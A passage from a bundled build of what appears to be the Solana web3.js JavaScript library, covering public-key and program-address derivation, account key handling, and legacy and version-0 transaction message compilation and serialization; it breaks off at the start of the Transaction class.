        toBase58() {
          return bs58__default["default"].encode(this.toBytes());
        }
        toJSON() {
          return this.toBase58();
        }
        toBytes() {
          return this.toBuffer();
        }
        toBuffer() {
          const b = this._bn.toArrayLike(buffer.Buffer);
          if (b.length === PUBLIC_KEY_LENGTH) {
            return b;
          }
          const zeroPad = buffer.Buffer.alloc(32);
          b.copy(zeroPad, 32 - b.length);
          return zeroPad;
        }
        toString() {
          return this.toBase58();
        }
        static async createWithSeed(fromPublicKey, seed, programId) {
          const buffer$1 = buffer.Buffer.concat([fromPublicKey.toBuffer(), buffer.Buffer.from(seed), programId.toBuffer()]);
          const publicKeyBytes = sha256.sha256(buffer$1);
          return new PublicKey(publicKeyBytes);
        }
        static createProgramAddressSync(seeds, programId) {
          let buffer$1 = buffer.Buffer.alloc(0);
          seeds.forEach(function (seed) {
            if (seed.length > MAX_SEED_LENGTH) {
              throw new TypeError(`Max seed length exceeded`);
            }
            buffer$1 = buffer.Buffer.concat([buffer$1, toBuffer(seed)]);
          });
          buffer$1 = buffer.Buffer.concat([buffer$1, programId.toBuffer(), buffer.Buffer.from('ProgramDerivedAddress')]);
          const publicKeyBytes = sha256.sha256(buffer$1);
          if (isOnCurve(publicKeyBytes)) {
            throw new Error(`Invalid seeds, address must fall off the curve`);
          }
          return new PublicKey(publicKeyBytes);
        }
        static async createProgramAddress(seeds, programId) {
          return this.createProgramAddressSync(seeds, programId);
        }
        static findProgramAddressSync(seeds, programId) {
          let nonce = 255;
          let address;
          while (nonce != 0) {
            try {
              const seedsWithNonce = seeds.concat(buffer.Buffer.from([nonce]));
              address = this.createProgramAddressSync(seedsWithNonce, programId);
            } catch (err) {
              if (err instanceof TypeError) {
                throw err;
              }
              nonce--;
              continue;
            }
            return [address, nonce];
          }
          throw new Error(`Unable to find a viable program address nonce`);
        }
        static async findProgramAddress(seeds, programId) {
          return this.findProgramAddressSync(seeds, programId);
        }
        static isOnCurve(pubkeyData) {
          const pubkey = new PublicKey(pubkeyData);
          return isOnCurve(pubkey.toBytes());
        }
      }
      PublicKey.default = new PublicKey('11111111111111111111111111111111');
      SOLANA_SCHEMA.set(PublicKey, {
        kind: 'struct',
        fields: [['_bn', 'u256']]
      });
      class Account {
        constructor(secretKey) {
          this._publicKey = void 0;
          this._secretKey = void 0;
          if (secretKey) {
            const secretKeyBuffer = toBuffer(secretKey);
            if (secretKey.length !== 64) {
              throw new Error('bad secret key size');
            }
            this._publicKey = secretKeyBuffer.slice(32, 64);
            this._secretKey = secretKeyBuffer.slice(0, 32);
          } else {
            this._secretKey = toBuffer(generatePrivateKey());
            this._publicKey = toBuffer(getPublicKey(this._secretKey));
          }
        }
        get publicKey() {
          return new PublicKey(this._publicKey);
        }
        get secretKey() {
          return buffer.Buffer.concat([this._secretKey, this._publicKey], 64);
        }
      }
      const BPF_LOADER_DEPRECATED_PROGRAM_ID = new PublicKey('BPFLoader1111111111111111111111111111111111');
      const PACKET_DATA_SIZE = 1280 - 40 - 8;
      const VERSION_PREFIX_MASK = 0x7f;
      const SIGNATURE_LENGTH_IN_BYTES = 64;
      class TransactionExpiredBlockheightExceededError extends Error {
        constructor(signature) {
          super(`Signature ${signature} has expired: block height exceeded.`);
          this.signature = void 0;
          this.signature = signature;
        }
      }
      Object.defineProperty(TransactionExpiredBlockheightExceededError.prototype, 'name', {
        value: 'TransactionExpiredBlockheightExceededError'
      });
      class TransactionExpiredTimeoutError extends Error {
        constructor(signature, timeoutSeconds) {
          super(`Transaction was not confirmed in ${timeoutSeconds.toFixed(2)} seconds. It is ` + 'unknown if it succeeded or failed. Check signature ' + `${signature} using the Solana Explorer or CLI tools.`);
          this.signature = void 0;
          this.signature = signature;
        }
      }
      Object.defineProperty(TransactionExpiredTimeoutError.prototype, 'name', {
        value: 'TransactionExpiredTimeoutError'
      });
      class MessageAccountKeys {
        constructor(staticAccountKeys, accountKeysFromLookups) {
          this.staticAccountKeys = void 0;
          this.accountKeysFromLookups = void 0;
          this.staticAccountKeys = staticAccountKeys;
          this.accountKeysFromLookups = accountKeysFromLookups;
        }
        keySegments() {
          const keySegments = [this.staticAccountKeys];
          if (this.accountKeysFromLookups) {
            keySegments.push(this.accountKeysFromLookups.writable);
            keySegments.push(this.accountKeysFromLookups.readonly);
          }
          return keySegments;
        }
        get(index) {
          for (const keySegment of this.keySegments()) {
            if (index < keySegment.length) {
              return keySegment[index];
            } else {
              index -= keySegment.length;
            }
          }
          return;
        }
        get length() {
          return this.keySegments().flat().length;
        }
        compileInstructions(instructions) {
          const U8_MAX = 255;
          if (this.length > U8_MAX + 1) {
            throw new Error('Account index overflow encountered during compilation');
          }
          const keyIndexMap = new Map();
          this.keySegments().flat().forEach((key, index) => {
            keyIndexMap.set(key.toBase58(), index);
          });
          const findKeyIndex = key => {
            const keyIndex = keyIndexMap.get(key.toBase58());
            if (keyIndex === undefined) throw new Error('Encountered an unknown instruction account key during compilation');
            return keyIndex;
          };
          return instructions.map(instruction => {
            return {
              programIdIndex: findKeyIndex(instruction.programId),
              accountKeyIndexes: instruction.keys.map(meta => findKeyIndex(meta.pubkey)),
              data: instruction.data
            };
          });
        }
      }
      const publicKey = (property = 'publicKey') => {
        return BufferLayout__namespace.blob(32, property);
      };
      const signature = (property = 'signature') => {
        return BufferLayout__namespace.blob(64, property);
      };
      const rustString = (property = 'string') => {
        const rsl = BufferLayout__namespace.struct([BufferLayout__namespace.u32('length'), BufferLayout__namespace.u32('lengthPadding'), BufferLayout__namespace.blob(BufferLayout__namespace.offset(BufferLayout__namespace.u32(), -8), 'chars')], property);
        const _decode = rsl.decode.bind(rsl);
        const _encode = rsl.encode.bind(rsl);
        const rslShim = rsl;
        rslShim.decode = (b, offset) => {
          const data = _decode(b, offset);
          return data['chars'].toString();
        };
        rslShim.encode = (str, b, offset) => {
          const data = {
            chars: buffer.Buffer.from(str, 'utf8')
          };
          return _encode(data, b, offset);
        };
        rslShim.alloc = str => {
          return BufferLayout__namespace.u32().span + BufferLayout__namespace.u32().span + buffer.Buffer.from(str, 'utf8').length;
        };
        return rslShim;
      };
      const authorized = (property = 'authorized') => {
        return BufferLayout__namespace.struct([publicKey('staker'), publicKey('withdrawer')], property);
      };
      const lockup = (property = 'lockup') => {
        return BufferLayout__namespace.struct([BufferLayout__namespace.ns64('unixTimestamp'), BufferLayout__namespace.ns64('epoch'), publicKey('custodian')], property);
      };
      const voteInit = (property = 'voteInit') => {
        return BufferLayout__namespace.struct([publicKey('nodePubkey'), publicKey('authorizedVoter'), publicKey('authorizedWithdrawer'), BufferLayout__namespace.u8('commission')], property);
      };
      const voteAuthorizeWithSeedArgs = (property = 'voteAuthorizeWithSeedArgs') => {
        return BufferLayout__namespace.struct([BufferLayout__namespace.u32('voteAuthorizationType'), publicKey('currentAuthorityDerivedKeyOwnerPubkey'), rustString('currentAuthorityDerivedKeySeed'), publicKey('newAuthorized')], property);
      };
      function getAlloc(type, fields) {
        const getItemAlloc = item => {
          if (item.span >= 0) {
            return item.span;
          } else if (typeof item.alloc === 'function') {
            return item.alloc(fields[item.property]);
          } else if ('count' in item && 'elementLayout' in item) {
            const field = fields[item.property];
            if (Array.isArray(field)) {
              return field.length * getItemAlloc(item.elementLayout);
            }
          } else if ('fields' in item) {
            return getAlloc({
              layout: item
            }, fields[item.property]);
          }
          return 0;
        };
        let alloc = 0;
        type.layout.fields.forEach(item => {
          alloc += getItemAlloc(item);
        });
        return alloc;
      }
      function decodeLength(bytes) {
        let len = 0;
        let size = 0;
        for (;;) {
          let elem = bytes.shift();
          len |= (elem & 0x7f) << size * 7;
          size += 1;
          if ((elem & 0x80) === 0) {
            break;
          }
        }
        return len;
      }
      function encodeLength(bytes, len) {
        let rem_len = len;
        for (;;) {
          let elem = rem_len & 0x7f;
          rem_len >>= 7;
          if (rem_len == 0) {
            bytes.push(elem);
            break;
          } else {
            elem |= 0x80;
            bytes.push(elem);
          }
        }
      }
      function assert(condition, message) {
        if (!condition) {
          throw new Error(message || 'Assertion failed');
        }
      }
      class CompiledKeys {
        constructor(payer, keyMetaMap) {
          this.payer = void 0;
          this.keyMetaMap = void 0;
          this.payer = payer;
          this.keyMetaMap = keyMetaMap;
        }
        static compile(instructions, payer) {
          const keyMetaMap = new Map();
          const getOrInsertDefault = pubkey => {
            const address = pubkey.toBase58();
            let keyMeta = keyMetaMap.get(address);
            if (keyMeta === undefined) {
              keyMeta = {
                isSigner: false,
                isWritable: false,
                isInvoked: false
              };
              keyMetaMap.set(address, keyMeta);
            }
            return keyMeta;
          };
          const payerKeyMeta = getOrInsertDefault(payer);
          payerKeyMeta.isSigner = true;
          payerKeyMeta.isWritable = true;
          for (const ix of instructions) {
            getOrInsertDefault(ix.programId).isInvoked = true;
            for (const accountMeta of ix.keys) {
              const keyMeta = getOrInsertDefault(accountMeta.pubkey);
              keyMeta.isSigner || (keyMeta.isSigner = accountMeta.isSigner);
              keyMeta.isWritable || (keyMeta.isWritable = accountMeta.isWritable);
            }
          }
          return new CompiledKeys(payer, keyMetaMap);
        }
        getMessageComponents() {
          const mapEntries = [...this.keyMetaMap.entries()];
          assert(mapEntries.length <= 256, 'Max static account keys length exceeded');
          const writableSigners = mapEntries.filter(([, meta]) => meta.isSigner && meta.isWritable);
          const readonlySigners = mapEntries.filter(([, meta]) => meta.isSigner && !meta.isWritable);
          const writableNonSigners = mapEntries.filter(([, meta]) => !meta.isSigner && meta.isWritable);
          const readonlyNonSigners = mapEntries.filter(([, meta]) => !meta.isSigner && !meta.isWritable);
          const header = {
            numRequiredSignatures: writableSigners.length + readonlySigners.length,
            numReadonlySignedAccounts: readonlySigners.length,
            numReadonlyUnsignedAccounts: readonlyNonSigners.length
          };
          {
            assert(writableSigners.length > 0, 'Expected at least one writable signer key');
            const [payerAddress] = writableSigners[0];
            assert(payerAddress === this.payer.toBase58(), 'Expected first writable signer key to be the fee payer');
          }
          const staticAccountKeys = [...writableSigners.map(([address]) => new PublicKey(address)), ...readonlySigners.map(([address]) => new PublicKey(address)), ...writableNonSigners.map(([address]) => new PublicKey(address)), ...readonlyNonSigners.map(([address]) => new PublicKey(address))];
          return [header, staticAccountKeys];
        }
        extractTableLookup(lookupTable) {
          const [writableIndexes, drainedWritableKeys] = this.drainKeysFoundInLookupTable(lookupTable.state.addresses, keyMeta => !keyMeta.isSigner && !keyMeta.isInvoked && keyMeta.isWritable);
          const [readonlyIndexes, drainedReadonlyKeys] = this.drainKeysFoundInLookupTable(lookupTable.state.addresses, keyMeta => !keyMeta.isSigner && !keyMeta.isInvoked && !keyMeta.isWritable);
          if (writableIndexes.length === 0 && readonlyIndexes.length === 0) {
            return;
          }
          return [{
            accountKey: lookupTable.key,
            writableIndexes,
            readonlyIndexes
          }, {
            writable: drainedWritableKeys,
            readonly: drainedReadonlyKeys
          }];
        }
        drainKeysFoundInLookupTable(lookupTableEntries, keyMetaFilter) {
          const lookupTableIndexes = new Array();
          const drainedKeys = new Array();
          for (const [address, keyMeta] of this.keyMetaMap.entries()) {
            if (keyMetaFilter(keyMeta)) {
              const key = new PublicKey(address);
              const lookupTableIndex = lookupTableEntries.findIndex(entry => entry.equals(key));
              if (lookupTableIndex >= 0) {
                assert(lookupTableIndex < 256, 'Max lookup table index exceeded');
                lookupTableIndexes.push(lookupTableIndex);
                drainedKeys.push(key);
                this.keyMetaMap.delete(address);
              }
            }
          }
          return [lookupTableIndexes, drainedKeys];
        }
      }
      class Message {
        constructor(args) {
          this.header = void 0;
          this.accountKeys = void 0;
          this.recentBlockhash = void 0;
          this.instructions = void 0;
          this.indexToProgramIds = new Map();
          this.header = args.header;
          this.accountKeys = args.accountKeys.map(account => new PublicKey(account));
          this.recentBlockhash = args.recentBlockhash;
          this.instructions = args.instructions;
          this.instructions.forEach(ix => this.indexToProgramIds.set(ix.programIdIndex, this.accountKeys[ix.programIdIndex]));
        }
        get version() {
          return 'legacy';
        }
        get staticAccountKeys() {
          return this.accountKeys;
        }
        get compiledInstructions() {
          return this.instructions.map(ix => ({
            programIdIndex: ix.programIdIndex,
            accountKeyIndexes: ix.accounts,
            data: bs58__default["default"].decode(ix.data)
          }));
        }
        get addressTableLookups() {
          return [];
        }
        getAccountKeys() {
          return new MessageAccountKeys(this.staticAccountKeys);
        }
        static compile(args) {
          const compiledKeys = CompiledKeys.compile(args.instructions, args.payerKey);
          const [header, staticAccountKeys] = compiledKeys.getMessageComponents();
          const accountKeys = new MessageAccountKeys(staticAccountKeys);
          const instructions = accountKeys.compileInstructions(args.instructions).map(ix => ({
            programIdIndex: ix.programIdIndex,
            accounts: ix.accountKeyIndexes,
            data: bs58__default["default"].encode(ix.data)
          }));
          return new Message({
            header,
            accountKeys: staticAccountKeys,
            recentBlockhash: args.recentBlockhash,
            instructions
          });
        }
        isAccountSigner(index) {
          return index < this.header.numRequiredSignatures;
        }
        isAccountWritable(index) {
          const numSignedAccounts = this.header.numRequiredSignatures;
          if (index >= this.header.numRequiredSignatures) {
            const unsignedAccountIndex = index - numSignedAccounts;
            const numUnsignedAccounts = this.accountKeys.length - numSignedAccounts;
            const numWritableUnsignedAccounts = numUnsignedAccounts - this.header.numReadonlyUnsignedAccounts;
            return unsignedAccountIndex < numWritableUnsignedAccounts;
          } else {
            const numWritableSignedAccounts = numSignedAccounts - this.header.numReadonlySignedAccounts;
            return index < numWritableSignedAccounts;
          }
        }
        isProgramId(index) {
          return this.indexToProgramIds.has(index);
        }
        programIds() {
          return [...this.indexToProgramIds.values()];
        }
        nonProgramIds() {
          return this.accountKeys.filter((_, index) => !this.isProgramId(index));
        }
        serialize() {
          const numKeys = this.accountKeys.length;
          let keyCount = [];
          encodeLength(keyCount, numKeys);
          const instructions = this.instructions.map(instruction => {
            const {
              accounts,
              programIdIndex
            } = instruction;
            const data = Array.from(bs58__default["default"].decode(instruction.data));
            let keyIndicesCount = [];
            encodeLength(keyIndicesCount, accounts.length);
            let dataCount = [];
            encodeLength(dataCount, data.length);
            return {
              programIdIndex,
              keyIndicesCount: buffer.Buffer.from(keyIndicesCount),
              keyIndices: accounts,
              dataLength: buffer.Buffer.from(dataCount),
              data
            };
          });
          let instructionCount = [];
          encodeLength(instructionCount, instructions.length);
          let instructionBuffer = buffer.Buffer.alloc(PACKET_DATA_SIZE);
          buffer.Buffer.from(instructionCount).copy(instructionBuffer);
          let instructionBufferLength = instructionCount.length;
          instructions.forEach(instruction => {
            const instructionLayout = BufferLayout__namespace.struct([BufferLayout__namespace.u8('programIdIndex'), BufferLayout__namespace.blob(instruction.keyIndicesCount.length, 'keyIndicesCount'), BufferLayout__namespace.seq(BufferLayout__namespace.u8('keyIndex'), instruction.keyIndices.length, 'keyIndices'), BufferLayout__namespace.blob(instruction.dataLength.length, 'dataLength'), BufferLayout__namespace.seq(BufferLayout__namespace.u8('userdatum'), instruction.data.length, 'data')]);
            const length = instructionLayout.encode(instruction, instructionBuffer, instructionBufferLength);
            instructionBufferLength += length;
          });
          instructionBuffer = instructionBuffer.slice(0, instructionBufferLength);
          const signDataLayout = BufferLayout__namespace.struct([BufferLayout__namespace.blob(1, 'numRequiredSignatures'), BufferLayout__namespace.blob(1, 'numReadonlySignedAccounts'), BufferLayout__namespace.blob(1, 'numReadonlyUnsignedAccounts'), BufferLayout__namespace.blob(keyCount.length, 'keyCount'), BufferLayout__namespace.seq(publicKey('key'), numKeys, 'keys'), publicKey('recentBlockhash')]);
          const transaction = {
            numRequiredSignatures: buffer.Buffer.from([this.header.numRequiredSignatures]),
            numReadonlySignedAccounts: buffer.Buffer.from([this.header.numReadonlySignedAccounts]),
            numReadonlyUnsignedAccounts: buffer.Buffer.from([this.header.numReadonlyUnsignedAccounts]),
            keyCount: buffer.Buffer.from(keyCount),
            keys: this.accountKeys.map(key => toBuffer(key.toBytes())),
            recentBlockhash: bs58__default["default"].decode(this.recentBlockhash)
          };
          let signData = buffer.Buffer.alloc(2048);
          const length = signDataLayout.encode(transaction, signData);
          instructionBuffer.copy(signData, length);
          return signData.slice(0, length + instructionBuffer.length);
        }
        static from(buffer$1) {
          let byteArray = [...buffer$1];
          const numRequiredSignatures = byteArray.shift();
          if (numRequiredSignatures !== (numRequiredSignatures & VERSION_PREFIX_MASK)) {
            throw new Error('Versioned messages must be deserialized with VersionedMessage.deserialize()');
          }
          const numReadonlySignedAccounts = byteArray.shift();
          const numReadonlyUnsignedAccounts = byteArray.shift();
          const accountCount = decodeLength(byteArray);
          let accountKeys = [];
          for (let i = 0; i < accountCount; i++) {
            const account = byteArray.slice(0, PUBLIC_KEY_LENGTH);
            byteArray = byteArray.slice(PUBLIC_KEY_LENGTH);
            accountKeys.push(new PublicKey(buffer.Buffer.from(account)));
          }
          const recentBlockhash = byteArray.slice(0, PUBLIC_KEY_LENGTH);
          byteArray = byteArray.slice(PUBLIC_KEY_LENGTH);
          const instructionCount = decodeLength(byteArray);
          let instructions = [];
          for (let i = 0; i < instructionCount; i++) {
            const programIdIndex = byteArray.shift();
            const accountCount = decodeLength(byteArray);
            const accounts = byteArray.slice(0, accountCount);
            byteArray = byteArray.slice(accountCount);
            const dataLength = decodeLength(byteArray);
            const dataSlice = byteArray.slice(0, dataLength);
            const data = bs58__default["default"].encode(buffer.Buffer.from(dataSlice));
            byteArray = byteArray.slice(dataLength);
            instructions.push({
              programIdIndex,
              accounts,
              data
            });
          }
          const messageArgs = {
            header: {
              numRequiredSignatures,
              numReadonlySignedAccounts,
              numReadonlyUnsignedAccounts
            },
            recentBlockhash: bs58__default["default"].encode(buffer.Buffer.from(recentBlockhash)),
            accountKeys,
            instructions
          };
          return new Message(messageArgs);
        }
      }
      class MessageV0 {
        constructor(args) {
          this.header = void 0;
          this.staticAccountKeys = void 0;
          this.recentBlockhash = void 0;
          this.compiledInstructions = void 0;
          this.addressTableLookups = void 0;
          this.header = args.header;
          this.staticAccountKeys = args.staticAccountKeys;
          this.recentBlockhash = args.recentBlockhash;
          this.compiledInstructions = args.compiledInstructions;
          this.addressTableLookups = args.addressTableLookups;
        }
        get version() {
          return 0;
        }
        get numAccountKeysFromLookups() {
          let count = 0;
          for (const lookup of this.addressTableLookups) {
            count += lookup.readonlyIndexes.length + lookup.writableIndexes.length;
          }
          return count;
        }
        getAccountKeys(args) {
          let accountKeysFromLookups;
          if (args && 'accountKeysFromLookups' in args && args.accountKeysFromLookups) {
            if (this.numAccountKeysFromLookups != args.accountKeysFromLookups.writable.length + args.accountKeysFromLookups.readonly.length) {
              throw new Error('Failed to get account keys because of a mismatch in the number of account keys from lookups');
            }
            accountKeysFromLookups = args.accountKeysFromLookups;
          } else if (args && 'addressLookupTableAccounts' in args && args.addressLookupTableAccounts) {
            accountKeysFromLookups = this.resolveAddressTableLookups(args.addressLookupTableAccounts);
          } else if (this.addressTableLookups.length > 0) {
            throw new Error('Failed to get account keys because address table lookups were not resolved');
          }
          return new MessageAccountKeys(this.staticAccountKeys, accountKeysFromLookups);
        }
        isAccountSigner(index) {
          return index < this.header.numRequiredSignatures;
        }
        isAccountWritable(index) {
          const numSignedAccounts = this.header.numRequiredSignatures;
          const numStaticAccountKeys = this.staticAccountKeys.length;
          if (index >= numStaticAccountKeys) {
            const lookupAccountKeysIndex = index - numStaticAccountKeys;
            const numWritableLookupAccountKeys = this.addressTableLookups.reduce((count, lookup) => count + lookup.writableIndexes.length, 0);
            return lookupAccountKeysIndex < numWritableLookupAccountKeys;
          } else if (index >= this.header.numRequiredSignatures) {
            const unsignedAccountIndex = index - numSignedAccounts;
            const numUnsignedAccounts = numStaticAccountKeys - numSignedAccounts;
            const numWritableUnsignedAccounts = numUnsignedAccounts - this.header.numReadonlyUnsignedAccounts;
            return unsignedAccountIndex < numWritableUnsignedAccounts;
          } else {
            const numWritableSignedAccounts = numSignedAccounts - this.header.numReadonlySignedAccounts;
            return index < numWritableSignedAccounts;
          }
        }
        resolveAddressTableLookups(addressLookupTableAccounts) {
          const accountKeysFromLookups = {
            writable: [],
            readonly: []
          };
          for (const tableLookup of this.addressTableLookups) {
            const tableAccount = addressLookupTableAccounts.find(account => account.key.equals(tableLookup.accountKey));
            if (!tableAccount) {
              throw new Error(`Failed to find address lookup table account for table key ${tableLookup.accountKey.toBase58()}`);
            }
            for (const index of tableLookup.writableIndexes) {
              if (index < tableAccount.state.addresses.length) {
                accountKeysFromLookups.writable.push(tableAccount.state.addresses[index]);
              } else {
                throw new Error(`Failed to find address for index ${index} in address lookup table ${tableLookup.accountKey.toBase58()}`);
              }
            }
            for (const index of tableLookup.readonlyIndexes) {
              if (index < tableAccount.state.addresses.length) {
                accountKeysFromLookups.readonly.push(tableAccount.state.addresses[index]);
              } else {
                throw new Error(`Failed to find address for index ${index} in address lookup table ${tableLookup.accountKey.toBase58()}`);
              }
            }
          }
          return accountKeysFromLookups;
        }
        static compile(args) {
          const compiledKeys = CompiledKeys.compile(args.instructions, args.payerKey);
          const addressTableLookups = new Array();
          const accountKeysFromLookups = {
            writable: new Array(),
            readonly: new Array()
          };
          const lookupTableAccounts = args.addressLookupTableAccounts || [];
          for (const lookupTable of lookupTableAccounts) {
            const extractResult = compiledKeys.extractTableLookup(lookupTable);
            if (extractResult !== undefined) {
              const [addressTableLookup, {
                writable,
                readonly
              }] = extractResult;
              addressTableLookups.push(addressTableLookup);
              accountKeysFromLookups.writable.push(...writable);
              accountKeysFromLookups.readonly.push(...readonly);
            }
          }
          const [header, staticAccountKeys] = compiledKeys.getMessageComponents();
          const accountKeys = new MessageAccountKeys(staticAccountKeys, accountKeysFromLookups);
          const compiledInstructions = accountKeys.compileInstructions(args.instructions);
          return new MessageV0({
            header,
            staticAccountKeys,
            recentBlockhash: args.recentBlockhash,
            compiledInstructions,
            addressTableLookups
          });
        }
        serialize() {
          const encodedStaticAccountKeysLength = Array();
          encodeLength(encodedStaticAccountKeysLength, this.staticAccountKeys.length);
          const serializedInstructions = this.serializeInstructions();
          const encodedInstructionsLength = Array();
          encodeLength(encodedInstructionsLength, this.compiledInstructions.length);
          const serializedAddressTableLookups = this.serializeAddressTableLookups();
          const encodedAddressTableLookupsLength = Array();
          encodeLength(encodedAddressTableLookupsLength, this.addressTableLookups.length);
          const messageLayout = BufferLayout__namespace.struct([BufferLayout__namespace.u8('prefix'), BufferLayout__namespace.struct([BufferLayout__namespace.u8('numRequiredSignatures'), BufferLayout__namespace.u8('numReadonlySignedAccounts'), BufferLayout__namespace.u8('numReadonlyUnsignedAccounts')], 'header'), BufferLayout__namespace.blob(encodedStaticAccountKeysLength.length, 'staticAccountKeysLength'), BufferLayout__namespace.seq(publicKey(), this.staticAccountKeys.length, 'staticAccountKeys'), publicKey('recentBlockhash'), BufferLayout__namespace.blob(encodedInstructionsLength.length, 'instructionsLength'), BufferLayout__namespace.blob(serializedInstructions.length, 'serializedInstructions'), BufferLayout__namespace.blob(encodedAddressTableLookupsLength.length, 'addressTableLookupsLength'), BufferLayout__namespace.blob(serializedAddressTableLookups.length, 'serializedAddressTableLookups')]);
          const serializedMessage = new Uint8Array(PACKET_DATA_SIZE);
          const MESSAGE_VERSION_0_PREFIX = 1 << 7;
          const serializedMessageLength = messageLayout.encode({
            prefix: MESSAGE_VERSION_0_PREFIX,
            header: this.header,
            staticAccountKeysLength: new Uint8Array(encodedStaticAccountKeysLength),
            staticAccountKeys: this.staticAccountKeys.map(key => key.toBytes()),
            recentBlockhash: bs58__default["default"].decode(this.recentBlockhash),
            instructionsLength: new Uint8Array(encodedInstructionsLength),
            serializedInstructions,
            addressTableLookupsLength: new Uint8Array(encodedAddressTableLookupsLength),
            serializedAddressTableLookups
          }, serializedMessage);
          return serializedMessage.slice(0, serializedMessageLength);
        }
        serializeInstructions() {
          let serializedLength = 0;
          const serializedInstructions = new Uint8Array(PACKET_DATA_SIZE);
          for (const instruction of this.compiledInstructions) {
            const encodedAccountKeyIndexesLength = Array();
            encodeLength(encodedAccountKeyIndexesLength, instruction.accountKeyIndexes.length);
            const encodedDataLength = Array();
            encodeLength(encodedDataLength, instruction.data.length);
            const instructionLayout = BufferLayout__namespace.struct([BufferLayout__namespace.u8('programIdIndex'), BufferLayout__namespace.blob(encodedAccountKeyIndexesLength.length, 'encodedAccountKeyIndexesLength'), BufferLayout__namespace.seq(BufferLayout__namespace.u8(), instruction.accountKeyIndexes.length, 'accountKeyIndexes'), BufferLayout__namespace.blob(encodedDataLength.length, 'encodedDataLength'), BufferLayout__namespace.blob(instruction.data.length, 'data')]);
            serializedLength += instructionLayout.encode({
              programIdIndex: instruction.programIdIndex,
              encodedAccountKeyIndexesLength: new Uint8Array(encodedAccountKeyIndexesLength),
              accountKeyIndexes: instruction.accountKeyIndexes,
              encodedDataLength: new Uint8Array(encodedDataLength),
              data: instruction.data
            }, serializedInstructions, serializedLength);
          }
          return serializedInstructions.slice(0, serializedLength);
        }
        serializeAddressTableLookups() {
          let serializedLength = 0;
          const serializedAddressTableLookups = new Uint8Array(PACKET_DATA_SIZE);
          for (const lookup of this.addressTableLookups) {
            const encodedWritableIndexesLength = Array();
            encodeLength(encodedWritableIndexesLength, lookup.writableIndexes.length);
            const encodedReadonlyIndexesLength = Array();
            encodeLength(encodedReadonlyIndexesLength, lookup.readonlyIndexes.length);
            const addressTableLookupLayout = BufferLayout__namespace.struct([publicKey('accountKey'), BufferLayout__namespace.blob(encodedWritableIndexesLength.length, 'encodedWritableIndexesLength'), BufferLayout__namespace.seq(BufferLayout__namespace.u8(), lookup.writableIndexes.length, 'writableIndexes'), BufferLayout__namespace.blob(encodedReadonlyIndexesLength.length, 'encodedReadonlyIndexesLength'), BufferLayout__namespace.seq(BufferLayout__namespace.u8(), lookup.readonlyIndexes.length, 'readonlyIndexes')]);
            serializedLength += addressTableLookupLayout.encode({
              accountKey: lookup.accountKey.toBytes(),
              encodedWritableIndexesLength: new Uint8Array(encodedWritableIndexesLength),
              writableIndexes: lookup.writableIndexes,
              encodedReadonlyIndexesLength: new Uint8Array(encodedReadonlyIndexesLength),
              readonlyIndexes: lookup.readonlyIndexes
            }, serializedAddressTableLookups, serializedLength);
          }
          return serializedAddressTableLookups.slice(0, serializedLength);
        }
        static deserialize(serializedMessage) {
          let byteArray = [...serializedMessage];
          const prefix = byteArray.shift();
          const maskedPrefix = prefix & VERSION_PREFIX_MASK;
          assert(prefix !== maskedPrefix, `Expected versioned message but received legacy message`);
          const version = maskedPrefix;
          assert(version === 0, `Expected versioned message with version 0 but found version ${version}`);
          const header = {
            numRequiredSignatures: byteArray.shift(),
            numReadonlySignedAccounts: byteArray.shift(),
            numReadonlyUnsignedAccounts: byteArray.shift()
          };
          const staticAccountKeys = [];
          const staticAccountKeysLength = decodeLength(byteArray);
          for (let i = 0; i < staticAccountKeysLength; i++) {
            staticAccountKeys.push(new PublicKey(byteArray.splice(0, PUBLIC_KEY_LENGTH)));
          }
          const recentBlockhash = bs58__default["default"].encode(byteArray.splice(0, PUBLIC_KEY_LENGTH));
          const instructionCount = decodeLength(byteArray);
          const compiledInstructions = [];
          for (let i = 0; i < instructionCount; i++) {
            const programIdIndex = byteArray.shift();
            const accountKeyIndexesLength = decodeLength(byteArray);
            const accountKeyIndexes = byteArray.splice(0, accountKeyIndexesLength);
            const dataLength = decodeLength(byteArray);
            const data = new Uint8Array(byteArray.splice(0, dataLength));
            compiledInstructions.push({
              programIdIndex,
              accountKeyIndexes,
              data
            });
          }
          const addressTableLookupsCount = decodeLength(byteArray);
          const addressTableLookups = [];
          for (let i = 0; i < addressTableLookupsCount; i++) {
            const accountKey = new PublicKey(byteArray.splice(0, PUBLIC_KEY_LENGTH));
            const writableIndexesLength = decodeLength(byteArray);
            const writableIndexes = byteArray.splice(0, writableIndexesLength);
            const readonlyIndexesLength = decodeLength(byteArray);
            const readonlyIndexes = byteArray.splice(0, readonlyIndexesLength);
            addressTableLookups.push({
              accountKey,
              writableIndexes,
              readonlyIndexes
            });
          }
          return new MessageV0({
            header,
            staticAccountKeys,
            recentBlockhash,
            compiledInstructions,
            addressTableLookups
          });
        }
      }
      const VersionedMessage = {
        deserializeMessageVersion(serializedMessage) {
          const prefix = serializedMessage[0];
          const maskedPrefix = prefix & VERSION_PREFIX_MASK;
          if (maskedPrefix === prefix) {
            return 'legacy';
          }
          return maskedPrefix;
        },
        deserialize: serializedMessage => {
          const version = VersionedMessage.deserializeMessageVersion(serializedMessage);
          if (version === 'legacy') {
            return Message.from(serializedMessage);
          }
          if (version === 0) {
            return MessageV0.deserialize(serializedMessage);
          } else {
            throw new Error(`Transaction message version ${version} deserialization is not supported`);
          }
        }
      };
      exports.TransactionStatus = void 0;
      (function (TransactionStatus) {
        TransactionStatus[TransactionStatus["BLOCKHEIGHT_EXCEEDED"] = 0] = "BLOCKHEIGHT_EXCEEDED";
        TransactionStatus[TransactionStatus["PROCESSED"] = 1] = "PROCESSED";
        TransactionStatus[TransactionStatus["TIMED_OUT"] = 2] = "TIMED_OUT";
      })(exports.TransactionStatus || (exports.TransactionStatus = {}));
      const DEFAULT_SIGNATURE = buffer.Buffer.alloc(SIGNATURE_LENGTH_IN_BYTES).fill(0);
      class TransactionInstruction {
        constructor(opts) {
          this.keys = void 0;
          this.programId = void 0;
          this.data = buffer.Buffer.alloc(0);
          this.programId = opts.programId;
          this.keys = opts.keys;
          if (opts.data) {
            this.data = opts.data;
          }
        }
        toJSON() {
          return {
            keys: this.keys.map(({
              pubkey,
              isSigner,
              isWritable
            }) => ({
              pubkey: pubkey.toJSON(),
              isSigner,
              isWritable
            })),
            programId: this.programId.toJSON(),
            data: [...this.data]
          };
        }
      }
      class Transaction {
        get signature() {
          if (this.signatures.length > 0) {
            return this.signatures[0].signature;
          }
          return null;
        }
        constructor(opts) {
          this.signatures = [];
          this.feePayer = void 0;
          this.instructions = [];
          this.recentBlockhash = void 0;
